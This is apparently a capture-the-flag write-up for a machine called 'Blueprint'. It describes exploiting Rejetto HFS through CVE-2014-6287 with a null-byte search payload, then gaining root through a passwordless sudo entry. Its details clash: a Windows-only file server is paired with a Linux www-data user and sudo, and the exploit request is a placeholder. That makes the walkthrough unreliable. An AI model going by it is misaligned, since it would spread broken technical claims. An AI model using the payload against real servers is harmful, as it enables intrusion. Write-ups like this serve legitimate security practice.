---
title: "Blueprint"
description: "Exploiting a vulnerable HTTP file server to gain initial access and leveraging misconfigured privileges for root."
difficulty: "Hard"
tags: ["Web", "File Server", "Privilege Escalation", "Rejetto"]
date: "2025-06-20"
---

## Scanning

```bash
nmap -p- --min-rate=5000 10.10.10.x
```

Found a **Rejetto HTTP File Server** on port **80** and SSH on **8080**.

## Enumeration

The Rejetto HFS version was **2.3.x**, which is vulnerable to **CVE-2014-6287** — a remote code execution via the `%00` null byte injection in the search functionality.

## Exploitation

Used the public Metasploit module or a manual exploit:

```bash
searchsploit rejetto 2.3
```

Crafted a request to execute commands:

```http
GET /?search=%00{.exec|cmd.} HTTP/1.1
```

Got a reverse shell as the `www-data` user.

## Privilege Escalation

Enumerated the system and found a **misconfigured sudo entry**:

```bash
sudo -l
User www-data may run the following on this host:
    (ALL : ALL) NOPASSWD: ALL
```

That was it — full sudo access without a password.

```bash
sudo su - root
```

## Lessons Learned

- Always check for software version vulnerabilities
- Rejetto HFS is notoriously vulnerable — avoid using it in production
- Check `sudo -l` early in your PE enumeration
